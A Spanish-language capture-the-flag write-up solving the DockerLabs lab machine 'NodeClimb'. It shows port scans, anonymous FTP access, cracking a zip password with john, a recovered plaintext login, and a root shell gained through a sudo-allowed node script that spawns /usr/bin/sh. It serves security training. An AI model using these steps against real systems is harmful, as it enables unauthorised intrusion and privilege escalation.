#MAQUINA #DOCKERLABS #FACIL
#FTP_ANON 
<hr>
# RECONOCIMIENTO

Vamos a resolver **NodeClimb** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash
nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-04 12:37 CET
Initiating ARP Ping Scan at 12:37
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 12:37, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:37
Scanning 172.17.0.2 [65535 ports]
Discovered open port 21/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Completed SYN Stealth Scan at 12:37, 0.48s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2024-12-04 12:37:40 CET for 1s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **21(FTP)** y el puerto **22(SSH)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash
nmap -sCV -p21,22 172.17.0.2                     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-04 12:38 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.000024s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             242 Jul 05 09:34 secretitopicaron.zip
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 cd:1f:3b:2d:c4:0b:99:03:e6:a3:5c:26:f5:4b:47:ae (ECDSA)
|_  256 a0:d4:92:f6:9b:db:12:2b:77:b6:b1:58:e0:70:56:f0 (ED25519)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.59 seconds
```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.

**Conclusiones:** El puerto FTP es vulenrable a **ftp-anon** (usuario anonymous sin contra).

## FTP(21)

Al ingresar vemos un zip y al traerlo vemos que para hacer unzip necesitamos una contra, por lo que usaremos john : 

   ```bash
└─# zip2john secretitopicaron.zip > x
ver 1.0 efh 5455 efh 7875 secretitopicaron.zip/password.txt PKZIP Encr: 2b chk, TS_chk, cmplen=52, decmplen=40, crc=59D5D024 ts=4C03 cs=4c03 type=0
                                                                                                                                                                       
└─# john x --show
secretitopicaron.zip/password.txt:password1:password.txt:secretitopicaron.zip::secretitopicaron.zip

1 password hash cracked, 0 left
                                                                                                                                                                    
└─# unzip secretitopicaron.zip
Archive:  secretitopicaron.zip
[secretitopicaron.zip] password.txt password: 
 extracting: password.txt  
```

Al revisar el password vemos lo siguiente :

   ```bash
   
mario:laKontraseñAmasmalotaHdelbarrioH

```

# ESCALADA PRIVILEGIOS

Buscamos archivos con permisos SUID:
   ```bash
mario@4e52535d520a:~$ sudo -l
Matching Defaults entries for mario on 4e52535d520a:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on 4e52535d520a:
    (ALL) NOPASSWD: /usr/bin/node /home/mario/script.js
```

Vemos **/home/mario/script.js** con permisos SUDO. Es nuestro el archivo, cambiamos permisos y contenido y lo ejecutamos con sudo:
   ```bash
mario@4e52535d520a:~$ sudo -l
Matching Defaults entries for mario on 4e52535d520a:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on 4e52535d520a:
    (ALL) NOPASSWD: /usr/bin/node /home/mario/script.js
mario@4e52535d520a:~$ cat script.js 
require("child_process").spawn("/usr/bin/sh", {stdio: [0, 1, 2]})
mario@4e52535d520a:~$ sudo /usr/bin/node /home/mario/script.js 
# whoami
root
# 
```

**YA ESTAMOS COMO ROOT.**